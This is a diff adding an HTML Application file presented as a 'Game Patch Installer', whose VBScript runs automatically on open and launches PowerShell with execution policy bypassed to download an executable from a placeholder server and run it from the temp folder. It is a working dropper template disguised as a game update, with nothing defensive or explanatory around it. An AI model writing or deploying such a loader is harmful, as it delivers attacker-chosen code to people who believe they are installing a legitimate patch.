@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Game Patch Installer</title>
+    <HTA:APPLICATION 
+        ID="PatchInstaller"
+        APPLICATIONNAME="Game Patch Installer"
+        BORDER="thin"
+        CAPTION="yes"
+        SCROLL="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="yes"
+    >
+</head>
+<body>
+<script type="text/vbscript">
+    Sub DownloadAndExecuteWithPowerShell()
+        Dim psCommand, shell
+
+        ' Define PowerShell command to download and execute the patch
+        psCommand = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
+                    "'$patchUrl = ""http://<your-server-ip>:8080/patch.exe""; " & _
+                    "$tempPath = [System.IO.Path]::Combine($env:TEMP, ""patch.exe""); " & _
+                    "Invoke-WebRequest -Uri $patchUrl -OutFile $tempPath; " & _
+                    "Start-Process -FilePath $tempPath -Wait'"
+
+        ' Run the PowerShell command
+        Set shell = CreateObject("WScript.Shell")
+        shell.Run psCommand, 1, True
+    End Sub
+
+    ' Trigger the patch download and execution
+    DownloadAndExecuteWithPowerShell()
+</script>
+</body>
+</html>
